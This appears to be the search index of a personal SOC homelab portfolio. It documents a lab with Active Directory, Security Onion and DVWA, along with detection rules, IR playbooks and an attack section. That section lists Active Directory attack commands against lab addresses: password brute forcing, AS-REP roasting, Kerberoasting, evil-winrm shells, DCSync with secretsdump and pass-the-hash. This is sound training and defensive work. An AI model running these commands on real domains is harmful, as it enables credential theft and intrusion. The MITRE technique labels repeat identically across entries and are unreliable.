{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"SOC Homelab \u2013 Quick Start","text":"<p>This portfolio documents my SOC analyst homelab. It simulates an enterprise network with Active Directory, Security Onion (Zeek + Suricata + Elastic/Fleet/Kibana), and an Ubuntu Webserver. I perform adversary emulation mapped to MITRE ATT&amp;CK, build detection content, and practice incident response.</p> <p>How to navigate</p> <p>Use the left Table of Contents to jump to VM Builds, Detections, Attacks (MITRE), IR Playbooks, and Results. Each section is self\u2011contained with commands and screenshots.</p>"},{"location":"#highlights","title":"Highlights","text":"<ul> <li>Coverage: TBD / TBD ATT&amp;CK techniques detected</li> <li>Mean time to detect (MTTD): TBD</li> <li>Platform: VMware, Windows Server 2025 DC, Windows 11 client, Ubuntu DVWA</li> <li>Monitoring: Security Onion (Kibana dashboards, Zeek logs, Suricata alerts), Elastic Agent on endpoints</li> <li>Network: Isolated LAN (192.168.25.0/24)</li> </ul>"},{"location":"#what-this-project-demonstrates","title":"What this project demonstrates","text":"<ul> <li>Hands\u2011on blue team skills: log collection, detection engineering, triage, and reporting</li> <li>Hands-on red team skills: pen testing Active Directory and web applications</li> <li>Clear documentation &amp; reproducibility for every VM, attack, and detection</li> </ul>"},{"location":"results/","title":"Results &amp; Lessons","text":""},{"location":"results/#coverage-snapshot","title":"Coverage snapshot","text":"Tactic Techniques Attempted Detected Notes Initial Access TBD TBD DMZ NAT logs + Suricata Execution TBD TBD PowerShell, MSI Persistence TBD TBD Run keys, services Credential Access TBD TBD LSASS, NTDS.dit Lateral Movement TBD TBD SMB/RDP, admin shares Exfiltration TBD TBD DNS/HTTP anomalies"},{"location":"results/#metrics","title":"Metrics","text":"<ul> <li>Detections fired: TBD</li> <li>False positives tuned: TBD</li> <li>Mean time to detect (MTTD): TBD</li> </ul>"},{"location":"results/#what-i-would-improve-next","title":"What I would improve next","text":"<ul> <li>Turning the web server into a honey pot by moving it into a segmented network</li> </ul>"},{"location":"topology/","title":"Topology","text":""},{"location":"appendix/commands/","title":"Appendix \u2013 Commands &amp; Config","text":""},{"location":"appendix/commands/#build-scripts","title":"Build scripts","text":"<pre><code># Example: install Elastic Agent (Linux)\nsudo ./elastic-agent install   --url=https://192.168.25.10:8220   --enrollment-token=&lt;token&gt;   --insecure\n</code></pre>"},{"location":"appendix/commands/#useful-kql-snippets","title":"Useful KQL snippets","text":"<pre><code>event.code: (4624 or 4625) and winlog.logon.type: 10  // RDP logons\n</code></pre>"},{"location":"appendix/commands/#suricata-local-rules","title":"Suricata local rules","text":"<pre><code>include: /etc/suricata/rules/local.rules\n</code></pre> <p>Add more: GPO exports, Sysmon config, pfSense ruleset export, etc.</p>"},{"location":"attacks/","title":"Attack Scenarios (mapped to MITRE ATT&amp;CK)","text":"<p>Passwords and hashes have been concealed to retain confidentiality.</p>"},{"location":"attacks/#brute-forcing-guest-account","title":"Brute Forcing Guest Account","text":"<ul> <li>Techniques: T1021.002 (SMB), T1003 (Credential Dumping)</li> <li>Procedure:</li> </ul> <p><code>nxc ldap 192.168.25.137 -u 'Guest' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding</code> </p>"},{"location":"attacks/#enumerating-smb-shares","title":"Enumerating SMB Shares","text":"<ul> <li>Techniques: T1021.002 (SMB), T1003 (Credential Dumping)</li> <li>Procedure:</li> </ul> <p><code>nxc smb 192.168.25.141 -u 'Guest' -p '_________' --shares</code> </p>"},{"location":"attacks/#asreproast-domain-account","title":"ASReproast Domain Account","text":"<ul> <li>Techniques: T1021.002 (SMB), T1003 (Credential Dumping)</li> <li>Procedure:</li> </ul> <p><code>nxc ldap 192.168.25.137 -u 'Bob' -p '' --asreproast asreproast.txt</code> <code>john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.txt</code> </p>"},{"location":"attacks/#winrm-shell-with-domain-account","title":"WinRM Shell with Domain Account","text":"<ul> <li>Techniques: T1021.002 (SMB), T1003 (Credential Dumping)</li> <li>Procedure:</li> </ul> <p><code>nxc winrm 192.168.25.137 -u 'Bob' -p '_________\u2019</code> <code>evil-winrm -i 192.168.25.137 -u 'bob' -p '_________\u2019</code> </p>"},{"location":"attacks/#upload-and-execution-of-sharphound","title":"Upload and Execution of SharpHound","text":"<ul> <li>Techniques: T1021.002 (SMB), T1003 (Credential Dumping)</li> <li>Procedure:</li> </ul> <p><code>upload SharpHound.exe</code> <code>./SharpHound.exe</code> </p>"},{"location":"attacks/#exfiltration-of-data-collected-by-sharphound","title":"Exfiltration of Data Collected by SharpHound","text":"<ul> <li>Techniques: T1021.002 (SMB), T1003 (Credential Dumping)</li> <li>Procedure:</li> </ul> <p><code>download 20250910173643_BloodHound.zip</code> </p>"},{"location":"attacks/#bloodhound","title":"Bloodhound","text":"<ul> <li>Techniques: T1021.002 (SMB), T1003 (Credential Dumping)</li> <li>Procedure:</li> </ul> <p><code>download 20250910173643_BloodHound.zip</code> </p>"},{"location":"attacks/#kerberoast-of-service-account","title":"Kerberoast of Service Account","text":"<ul> <li>Techniques: T1021.002 (SMB), T1003 (Credential Dumping)</li> <li>Procedure:</li> </ul> <p><code>nxc ldap 192.168.25.137 -u 'Bob' -p '_________' --kerberoasting kerbroast.txt</code> <code>john --wordlist=/usr/share/wordlists/rockyou.txt kerbroast.txt</code> </p>"},{"location":"attacks/#dcsync","title":"DCSync","text":"<ul> <li>Techniques: T1021.002 (SMB), T1003 (Credential Dumping)</li> <li>Procedure:</li> </ul> <p><code>impacket-secretsdump -just-dc LAB/svc-test:'_________'@WIN-LLBIAPV2E9D.lab.local</code> </p>"},{"location":"attacks/#pass-the-hash-to-login-as-domain-admin","title":"Pass-the-hash to Login as Domain Admin","text":"<ul> <li>Techniques: T1021.002 (SMB), T1003 (Credential Dumping)</li> <li>Procedure:</li> </ul> <p><code>evil-winrm -i 192.168.25.137 -u 'Administrator' -H '__________________\u2019</code> </p>"},{"location":"detections/","title":"Detections &amp; Dashboards","text":"<p>This section documents custom rules and visualizations. Each item includes the ATT&amp;CK technique, signal logic, and validation evidence.</p>"},{"location":"detections/#example-suspicious-powershell-t1059001","title":"Example \u2013 Suspicious PowerShell (T1059.001)","text":"<p>KQL (Elastic): <pre><code>index = \"logs-windows.*\" and process.name : \"powershell.exe\" and process.args : (\"-enc\" or \"EncodedCommand\" or \"FromBase64String\")\n</code></pre></p> <p>Why it works: Encoded commands and Base64 patterns are common in obfuscated PS attacks. Validation: Ran <code>powershell -enc &lt;payload&gt;</code> on Workstation; alert fired and triaged.</p>"},{"location":"detections/#example-web-shell-write-in-dvwa-t1505003","title":"Example \u2013 Web Shell Write in DVWA (T1505.003)","text":"<p>Suricata rule (DMZ inline): <pre><code>alert http any any -&gt; $DMZ_WEB any (msg:\"WEB: Possible PHP webshell upload\"; flow:to_server,established; http.uri; content:\".php\"; nocase; http.request_body; content:\"&lt;?php\"; within:200; classtype:web-application-attack; sid:900001; rev:1;)\n</code></pre></p> <p>Dashboard: DMZ Inbound \u2013 top src IP/ASN, URIs, HTTP methods, status codes, IPS drops vs IDS alerts.</p> <p>Add more items for credential access, lateral movement, persistence, discovery, exfiltration\u2026</p>"},{"location":"ir/","title":"IR Playbooks &amp; Case Notes","text":""},{"location":"ir/#playbook-suspicious-powershell-on-workstation","title":"Playbook: Suspicious PowerShell on Workstation","text":"<ul> <li>Trigger: Detection rule Suspicious PowerShell fired.</li> <li>Triage: Confirm user/process tree; retrieve command line; check network egress.</li> <li>Contain: Quarantine host (isolate NIC), disable user if compromised.</li> <li>Eradication/Recovery: Remove persistence, patch, unblock after monitoring.</li> <li>Evidences: Links to Kibana saved view, hashes, timeline.</li> </ul>"},{"location":"ir/#playbook-web-shell-on-dvwa","title":"Playbook: Web Shell on DVWA","text":"<ul> <li>Trigger: Suricata + Zeek HTTP anomaly.</li> <li>Triage: Pull web access logs, identify upload, carve sample, VT scan.</li> <li>Contain: Disable NAT to DVWA, rotate credentials, snapshot for forensics.</li> <li>Lessons Learned: Tighten egress, add WAF signatures, improve upload filtering.</li> </ul>"},{"location":"vm/dc/","title":"Windows Server 2025 \u2013 Domain Controller","text":""},{"location":"vm/dc/#purpose","title":"Purpose","text":"<p>Active Directory domain services; realistic enterprise authentication/authorization traffic.</p>"},{"location":"vm/dc/#specs","title":"Specs","text":"<ul> <li>Hostname: <code>DC01.lab.local</code> \u2022 IP: <code>192.168.25.137</code></li> <li>Roles: AD DS, DNS</li> <li>Logging: Windows event forwarding via Elastic Agent; Sysmon (suggested)</li> </ul>"},{"location":"vm/dc/#build-notes","title":"Build Notes","text":"<ol> <li>Install Server 2025 \u2192 promote to new forest <code>lab.local</code>.</li> <li>Create OUs (Workstations, Users, Service Accounts).</li> <li>GPOs for logging/hardening (PowerShell logging, Defender, Sysmon if used).</li> </ol>"},{"location":"vm/dc/#validation","title":"Validation","text":"<ul> <li>Join <code>Workstation-A.lab.local</code> to domain.</li> <li>Confirm Kerberos/NTLM events in Kibana (<code>event.code: 4624/4625</code> etc.).</li> </ul>"},{"location":"vm/dc/#introducing-vulnerabilities","title":"Introducing Vulnerabilities","text":""},{"location":"vm/dc/#install-step-by-step","title":"Install (step-by-step)","text":"<p>"},{"location":"vm/security-onion/","title":"Security Onion (Fleet \u2022 Kibana \u2022 Suricata \u2022 Zeek)","text":""},{"location":"vm/security-onion/#purpose","title":"Purpose","text":"<p>Single pane for network + endpoint telemetry; manage Elastic Agent, build alerts/dashboards.</p>"},{"location":"vm/security-onion/#specs","title":"Specs","text":"<ul> <li>Ubuntu (Security Onion ISO)</li> <li>NICs: Mgmt <code>192.168.25.10/24</code>, Sensor-LAN (no IP)</li> <li>16gb of memory</li> </ul>"},{"location":"vm/security-onion/#install-highlevel","title":"Install (high\u2011level)","text":"<ol> <li>Deploy VM from SO ISO \u2192 Standalone install.</li> <li>Assign interfaces: <code>so-mgmt</code> (IP), <code>sensor-lan</code> (no IP).</li> <li>Enable Fleet/Elastic.</li> </ol>"},{"location":"vm/security-onion/#validation","title":"Validation","text":"<ul> <li>Confirm Zeek logs arrive: <code>index=zeek*</code> in Kibana:</li> <li>Confirm Suricata alerts: <code>index=so-suricata*</code> and test with Nmap/nikto from Kali:</li> <li>Confirm Elastic Agent heartbeats from each VM:</li> <li>Confirm Security Onion containers are up and running: <pre><code>sudo so-status\n</code></pre> </li> </ul>"},{"location":"vm/security-onion/#install-step-by-step","title":"Install (step-by-step)","text":"<p>"},{"location":"vm/webserver/","title":"Ubuntu \u2013 Webserver (DVWA)","text":""},{"location":"vm/webserver/#purpose","title":"Purpose","text":"<p>Intentionally vulnerable web app.</p>"},{"location":"vm/webserver/#specs","title":"Specs","text":"<ul> <li>IP: <code>192.168.26.10</code> (DMZ)</li> <li>Services: Nginx/Apache, PHP/MySQL, DVWA</li> <li>Security: Minimal hardening, egress restricted, unique creds</li> </ul>"},{"location":"vm/webserver/#build-notes","title":"Build Notes","text":"<ol> <li>Install Ubuntu Server \u2192 static IP <code>192.168.26.10</code>.</li> <li>Install DVWA stack (web/PHP/MySQL), set DVWA security level to low for testing.</li> <li>Elastic Agent enrolled; ship nginx/apache, auth, and system logs to Fleet.</li> <li>Expose via firewall NAT: WAN \u2192 80/443 \u2192 <code>192.168.26.10</code>.</li> <li>Optional: Suricata inline IPS on DMZ at the firewall.</li> </ol>"},{"location":"vm/webserver/#validation","title":"Validation","text":"<ul> <li>From Internet/Kali: run Nikto, SQLi/XSS probes, file uploads.</li> <li>In Kibana: confirm access logs, WAF/Suricata alerts, and Zeek HTTP logs.</li> <li>Confirm DVWA is up and running: Go to http://192.168.25.142/DVWA </li> </ul>"},{"location":"vm/webserver/#install-step-by-step","title":"Install (step-by-step)","text":"<p>"},{"location":"vm/workstation/","title":"Windows 11 \u2013 Domain\u2011Joined Workstation","text":""},{"location":"vm/workstation/#purpose","title":"Purpose","text":"<p>User endpoint targeted for credential theft, lateral movement, and persistence TTPs.</p>"},{"location":"vm/workstation/#specs","title":"Specs","text":"<ul> <li>Hostname: <code>Workstation-A.lab.local</code> \u2022 IP: <code>192.168.25.141</code></li> <li>Elastic Agent installed; optional Sysmon</li> </ul>"},{"location":"vm/workstation/#validation","title":"Validation","text":"<ul> <li>Verify Agent enrolled in Fleet.</li> <li>Generate test telemetry: PowerShell, failed logons, Defender alerts.</li> </ul>"},{"location":"vm/workstation/#install-step-by-step","title":"Install (step-by-step)","text":"<p>"}]}